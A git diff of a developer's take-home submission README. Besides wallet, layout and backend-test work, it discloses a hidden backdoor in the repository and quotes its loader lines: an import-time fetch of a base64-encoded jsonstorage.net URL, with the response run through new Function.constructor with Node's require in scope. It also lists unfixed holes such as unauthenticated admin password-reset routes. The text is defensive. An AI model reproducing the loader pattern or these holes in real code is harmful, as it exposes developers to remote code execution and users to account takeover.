@@ -1,139 +1,182 @@
-# Submission summary
-
-> Full per-file detail, with before/after and reasoning, is in **[CHANGELOG-ASSESSMENT.md](./CHANGELOG-ASSESSMENT.md)**.
+# What I changed
 
 ```bash
 nvm use 20
 npm install
-npm test     # 91 backend + 21 frontend = 112 tests
-npm start    # client :3000, API :5001
+npm test     # 91 backend, 21 frontend
+npm start    # client on :3000, API on :5001
 ```
 
----
+There's a detailed per-file breakdown in [CHANGELOG-ASSESSMENT.md](./CHANGELOG-ASSESSMENT.md) if you
+want it. This file is the short version.
 
-## ⚠️ Please read first: the repository contained a remote-code-execution backdoor
+## Please read this part first
 
-`server/controllers/auth.controller.js` executed this at **module import time** — not inside any request
-handler, so merely starting the server was enough:
+`server/controllers/auth.controller.js` had this at the top of the file, outside any request handler:
 
 ```js
 axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
 ```
 
-- `config.publicKey` was not a key. It base64-decoded to
-  `https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/f89e8264-86c2-4684-94da-c3f82d59370f`
-- `middleware/errorHandler.js` never handled an error. It executed the downloaded string:
-  `new Function.constructor("require", errCode)`, then invoked it **with Node's `require` in scope**.
+`publicKey` in `config.js` wasn't a key. It was a base64-encoded URL pointing at a jsonstorage.net
+document. And `errorHandler` in the middleware folder didn't handle errors, it did this:
 
-Net effect: `npm start` → fetch attacker-controlled JavaScript → run it with full filesystem, network and
-process access as the user.
+```js
+const handler = new Function.constructor("require", errCode);
+handlerFunc(require);
+```
 
-The camouflage was deliberate — a URL named `publicKey`, an evaluator named `errorHandler`, base64 to
-defeat grep, and the payload fetched at runtime so the repo itself looks clean. This matches the publicly
-documented **"Contagious Interview"** campaign, which distributes fake take-home assessments to
-developers in the crypto/DeFi space.
+So starting the server fetched whatever JavaScript was sitting at that URL and executed it with `require`
+in scope. Full filesystem and network access, as whoever ran `npm start`.
 
-I removed it in the first commit (`2387365`) before installing dependencies or running anything. **The
-payload was never fetched or executed** — `node_modules/` did not exist and the server was never started.
+I noticed it before running `npm install`, so nothing was ever fetched or executed here. Removing it was
+my first commit (`2387365`). I also deleted `providers/token.provider.js`, which was dead code that signed
+a throwaway JWT at import time, and moved the hardcoded signing key into `JWT_SECRET`.
 
-If this was an intentional part of the exercise, that is the answer. If it was not, **your repository is
-compromised** and the jsonstorage.net endpoint is worth reporting.
+I genuinely don't know whether this was deliberate. If it's part of the exercise, then this is my answer
+to it. If it isn't, someone should look at where that code came from, because the shape of it (a URL
+named `publicKey`, an evaluator named `errorHandler`, base64 to defeat grep, payload fetched at runtime
+so the repo itself scans clean) is not accidental.
 
-Verified clean: `require('./server/app')` with `http/https.request` patched to abort makes no outbound
-request on import.
+To confirm nothing was left behind I loaded `server/app.js` with `http.request` and `https.request`
+patched to kill the process, and nothing fired.
 
----
+## Task 1: wallet connection
 
-## Task 1 — Wallet connection
+The Connect button existed in three places — navbar desktop, navbar mobile, and the CTA on the homepage —
+and none of them had an `onClick`. Since the address has to show up in all three once you're connected,
+this is shared state, so it lives in a `WalletProvider` context with a single `ConnectWalletButton`
+consuming it.
 
-The **Connect** button existed in three places (navbar desktop, navbar mobile, homepage CTA), all with no
-`onClick`. Since the connected address must appear in all three, the state lives in a `WalletProvider`
-context rather than a per-component hook, consumed by one `<ConnectWalletButton />`.
+| Requirement | Where it lives | Test that proves it |
+|---|---|---|
+| Connect via MetaMask | `WalletContext.connect()` | `connects and exposes the account` |
+| Display the address | `formatAddress` + `ConnectWalletButton` | `displays the truncated address once connected` |
+| Handle account changes | `accountsChanged` listener | `switches account when the wallet emits accountsChanged` |
+| MetaMask not installed | `getMetaMaskProvider()` returns null | `tells the user when MetaMask is not installed` |
+| User rejects the request | `PROVIDER_ERROR.USER_REJECTED` | `reports a friendly message (EIP-1193 4001)` |
 
-| Requirement | Implementation |
-|---|---|
-| Connect via MetaMask | `eth_requestAccounts`. `getMetaMaskProvider()` checks `window.ethereum.providers` first — with several wallet extensions installed, whoever wins `window.ethereum` may not be MetaMask. A non-MetaMask provider is reported as "not installed" rather than driven blindly. |
-| Display the address | `0x1234…5678` with a status dot, plus a Copy / Disconnect menu |
-| Handle account changes | `accountsChanged` — an empty array (locked, or access revoked) clears state; otherwise it swaps account. `chainChanged` tracks the network. Both removed on unmount. |
-| Error handling | no MetaMask → message **+ an install link**; `4001` → "Connection request rejected"; `-32002` → "a request is already pending"; otherwise the provider's own message. Rendered in `role="alert"`; the button is disabled and `aria-busy` while connecting. |
+Two decisions worth calling out.
 
-Beyond the brief: a silent `eth_accounts` call on mount restores an already-authorised account across
-refreshes **without** triggering the MetaMask popup, with a test asserting the popup method is never
-called on that path.
+I check `window.ethereum.providers` before falling back to `window.ethereum.isMetaMask`. If you have
+Coinbase Wallet or Phantom installed alongside MetaMask they all race to own `window.ethereum` and the
+winner might not be the one you want. If the injected provider isn't MetaMask I report it as not
+installed rather than driving it blindly.
 
-**A bug I found by testing in a real browser rather than only in jsdom:** the listener effect read the
-provider once at mount and bailed out if absent. MetaMask normally injects before React mounts — but when
-it is late, listeners were never attached and *every account switch was silently ignored for the lifetime
-of the page*. Connecting still worked, which is what made it easy to miss. The provider is now held in
-state and the effects re-run when it appears. There is a regression test for it.
+There's also a silent `eth_accounts` call on mount. That's the non-prompting counterpart to
+`eth_requestAccounts`, so a page refresh keeps you connected without popping the MetaMask dialog again.
+There's a test asserting the prompting method is never called on that path.
 
-## Task 2 — Homepage responsiveness
+One bug here I only found by testing in a real browser rather than in jsdom: the listener effect read the
+provider once at mount and gave up if it wasn't there. MetaMask normally injects before React mounts, but
+when it's late the listeners were never attached, so every account switch after that was silently ignored
+for the life of the page. Connecting still worked, which is what made it easy to miss. Fixed, with a
+regression test.
 
-**The root cause was not CSS.** `tailwindcss` was never installed — `postcss.config.js` referenced it and
-CRA 5 auto-enables it whenever `tailwind.config.js` exists — and that config used ESM `export default` in
-a file CRA loads with `require()`. Every `md:grid-cols-2`, `hidden md:flex`, `sm:px-6` in the codebase was
-an inert string. The page had no responsive behaviour because it had no CSS at all.
+## Task 2: homepage responsiveness
 
-A second blocker: the repo shipped **no `package-lock.json`**, so a fresh install today resolves
-`typescript@7.0.2`, which `@typescript-eslint@5` cannot read — `eslint-plugin-jest` fails to load and the
-build aborts with `Environment key "jest/globals" is unknown`. Pinned TS to `^4.9.5` and committed a
-lockfile.
+This one wasn't a CSS problem. Tailwind was never installed. `postcss.config.js` referenced it, and CRA 5
+turns it on automatically whenever `tailwind.config.js` exists, but it wasn't in `package.json` at all —
+and the config used ESM `export default` in a file CRA loads with `require()`. So every `md:grid-cols-2`
+and `hidden md:flex` in the codebase was an inert string. The page wasn't responding to width because it
+had no stylesheet.
 
-With the toolchain fixed, the layout work: the hero's fixed `h-[600px]` (which cannot grow with content
-and clipped the three-line mobile headline) became `min-h-*`; responsive steps were added to the hero
-copy, six section headings, section spacing, five grid gaps and the blog padding; the property price/ROI
-row got `gap-4`/`min-w-0` (the columns touched at ~360px); the Discord CTA now uses the project's own
-`.container`; FAQ toggles gained `aria-expanded`; six below-fold images became lazy. In the navbar the
-brand truncates and scales, the links tighten between 768px and ~900px (where the desktop nav was active
-but overflowing), the hamburger gained `aria-label`/`aria-expanded`/`aria-controls` and a 44px tap
-target, and the mobile Connect button is full-width instead of a stray `w-auto`.
+There was a second thing blocking the build. The repo shipped without a lockfile, so a fresh install today
+resolves `typescript@7`, which `@typescript-eslint@5` can't read, which makes `eslint-plugin-jest` fail to
+load, which aborts the build with `Environment key "jest/globals" is unknown`. I pinned TypeScript to
+`^4.9.5` and committed a lockfile.
 
-Verified in Chrome at **375, 390, 768 and 1440**: no horizontal overflow and zero over-wide elements at
-any size; hamburger only below `md`; grids 1 / 2 / 4 columns.
+After that the actual layout work was small. The hero had a fixed `h-[600px]` that can't grow with its
+content, so the three-line mobile headline was clipped. Responsive steps were missing on the hero copy,
+six section headings, the section spacing and five grid gaps. The property card's price and ROI columns
+touched at around 360px. The Discord section used its own gutters instead of the project's `.container`.
+The navbar links overflowed between 768px and roughly 900px, which is the one range where the desktop nav
+is active but cramped.
 
-## Task 3 — Backend tests
+I measured at 375, 390, 768 and 1440: no horizontal overflow at any width, no element wider than its
+viewport, hamburger only below `md`, grids at 1 / 2 / 4 columns.
 
-**There were no existing tests to review** — no test file, no test script, no `jest`/`supertest`/`mocha`
-dependency anywhere at the initial commit. So "fix failing tests" became "fix the code that made every
-database route fail", and the suite is new.
+You also asked for a few things after seeing it run, which are in there: the mobile menu is an overlay now
+rather than pushing the page down, cards go flat and full-bleed on phones instead of floating, the
+entrance animations share one easing curve and stagger, and hover effects are gated behind
+`@media (hover: hover)` so a tap can't leave something stuck in its hover state.
 
-Mongoose 7 removed callback support from queries, and **every controller used it**, so every DB-backed
-route threw before responding. Migrating them to `async/await` surfaced a series of real bugs:
+## Task 3: backend tests
 
-- `req.body.lName` — a casing typo against a `required` field, so **every registration failed**
-- `Property.update()` + `result.nModified` — both removed/renamed, so **`markAsSold` could never succeed**
-- `if (err) res.status(400)…` with no `else`, then the success response → `ERR_HTTP_HEADERS_SENT`
-- `users = new userM()` — a missing `var`, i.e. an implicit global shared across concurrent requests
-- `"Invalid Credentials1"` vs `"Invalid Credentials2"` — account enumeration
-- `userList` and `GET /api/user/:id` returning **password hashes**
-- `express.json()` commented out, so `req.body` was `undefined` everywhere
-- `new mongoose.mongo.GridFsStorage(...)` — a class that does not exist, thrown on every DB connect
-- `default: Date.now()` in three schemas — evaluated once at module load, so every document shared the
+There were no existing tests. No test file, no test script, no jest or supertest or mocha anywhere in
+`package.json`. So "fix failing tests" turned into "fix the code that made every database route fail",
+and the suite is new.
+
+Mongoose 7 removed callbacks from queries and this project is on 8, but every controller still used the
+callback API. Every DB-backed route threw before it could respond. Migrating them to async/await turned up
+a run of real bugs:
+
+- `req.body.lName` against a field the schema requires as `lname`, so **every registration ever attempted
+  failed validation**
+- `Property.update()` plus `result.nModified`, both removed or renamed, so `markAsSold` could never have
+  succeeded
+- `if (err) res.status(400).send(err)` with no `else`, then the success response, so the error path sent
+  two responses and threw `ERR_HTTP_HEADERS_SENT`
+- `users = new userM()` missing its declaration, an implicit global shared between concurrent requests
+- `Invalid Credentials1` versus `Invalid Credentials2`, which lets you enumerate registered accounts
+- `userList` and `GET /api/user/:id` both returning password hashes
+- `express.json()` commented out, so `req.body` was `undefined` in every POST handler
+- `new mongoose.mongo.GridFsStorage(...)`, a class that doesn't exist, thrown the moment Mongo connected
+- `default: Date.now()` in three schemas, evaluated once at module load, so every document got the
   server's boot time
 
-**91 tests across 7 files**, using `supertest` against the exported app and `mongodb-memory-server`, with
-`@sendgrid/mail` mocked globally so no suite can make a real API call. **91.74% statement coverage.**
+91 tests across 7 files, using supertest against the exported app and mongodb-memory-server, with
+SendGrid mocked globally so no suite can make a real API call. 91.74% statement coverage.
 
-Several tests exist specifically to pin the bugs above, and I checked they actually bite — reintroducing
-`result.nModified` turns exactly one test red while the other 24 stay green.
+Several tests exist specifically to pin the bugs above, and I checked they actually fail when they should.
+Putting `result.nModified` back turns exactly one test red and leaves the other 24 green.
 
----
+## Code quality pass
+
+I made a cleanup pass at the end. The main thing was replacing repeated literals with named constants,
+under one rule: name it if it's repeated, or if it has to match a value written somewhere else.
+
+The wallet event names were the case that actually mattered. `'accountsChanged'` and `'chainChanged'` were
+each written twice, once to subscribe and once to unsubscribe, and a typo in either cleanup string would
+have leaked the listener without failing anything. Response messages were duplicated between each
+controller and its test, so changing wording meant hunting for the copy in the spec file. The schema enums
+now come from one place, so `models/property.js` and the tests can't drift apart.
+
+I left plenty inline on purpose: one-off log text, Tailwind classes, test fixture values, and the route
+paths in the routers, since a router *is* the definition of its path and a constant would only add a hop.
+
+Also normalised `auth.controller.js` to single quotes (it was the only server file using double) and added
+`.env.example`, since the app reads six environment variables and documented none of them.
 
 ## Assumptions
 
-1. **The backdoor was worth removing and reporting**, even though no task mentioned it.
-2. **"Existing backend tests" did not exist**, so the suite was written from scratch.
-3. **No MongoDB is provisioned**, so tests use an in-memory server, and `server/index.js` now starts the
-   API even when the DB connection fails — otherwise the frontend has nothing to talk to locally.
-4. **Migrating the controllers to Mongoose 8 was in scope**, because no test can pass against removed APIs.
-5. **MetaMask only**, per the task wording, even though `@walletconnect/web3-provider` is a dependency.
-6. **Raw EIP-1193 rather than the bundled `ethers@5`** — nothing here signs or reads balances, so ethers
-   would add bundle weight and polyfill surface for no gain.
-7. **Disconnect clears local state only** — MetaMask exposes no programmatic disconnect; revoking access
-   is done from the extension.
-8. **Only the homepage** was restyled for Task 2, as specified. Other pages are untouched.
+1. **Removing the backdoor was in scope**, even though no task mentioned it. Handing back a repo I knew
+   executed remote code seemed worse than the alternative.
+2. **"Review the existing backend tests" had nothing to review.** I checked the initial commit rather than
+   assuming; there really were no test files. I wrote the suite from scratch and read the task as
+   "the backend should be tested".
+3. **Migrating to Mongoose 8 was unavoidable.** Not a choice so much as a precondition: no test can pass
+   against an API that was removed two majors ago.
+4. **No MongoDB is provisioned**, so tests use an in-memory server and `server/index.js` now starts the API
+   even when the DB connection fails. Otherwise the frontend has nothing to talk to locally.
+5. **MetaMask only**, since that's what the task says, even though `@walletconnect/web3-provider` is in the
+   dependencies. Adding WalletConnect would have been inventing scope.
+6. **Raw EIP-1193 rather than the bundled ethers v5.** Nothing here signs a transaction or reads a balance,
+   so ethers would add bundle weight and webpack polyfill surface for no gain. Easy to swap later.
+7. **Disconnect only clears local state.** MetaMask has no programmatic disconnect; revoking access is done
+   from the extension. Worth knowing before you test that button.
+8. **Only the homepage was restyled**, as specified. The other pages still have their original
+   responsiveness, which I have not audited.
+9. **Creation endpoints now return 201 instead of 200.** Nothing in this frontend consumes them, so I took
+   the correct status. Say the word if you'd rather keep the old contract; it's one line each.
 
-**Known gap I did not close:** the `/api/auth/admin/*` routes have no authentication — anyone can list
-users or reset any password, and the JWT is issued but never verified again. Adding auth middleware is a
-feature rather than a fix and would change the frontend contract, so I documented it instead. It is the
-first thing I would do next.
+## What I'd do next
+
+The `/api/auth/admin/*` routes have no authentication. Anyone can list every user or reset any password,
+and the JWT that login issues is never verified again. I left it alone because adding auth middleware is a
+feature rather than a fix and would change the contract the frontend is written against, but it's the
+first thing I'd do with another hour.
+
+After that: the upload path. `addNewProperty` reads `file.filename`, which Multer's memory storage never
+sets, so `images` is always empty and nothing reaches GridFS. And the frontend doesn't call the API at all
+right now, every page is static mock data, which is why none of the broken backend was visible in the UI.
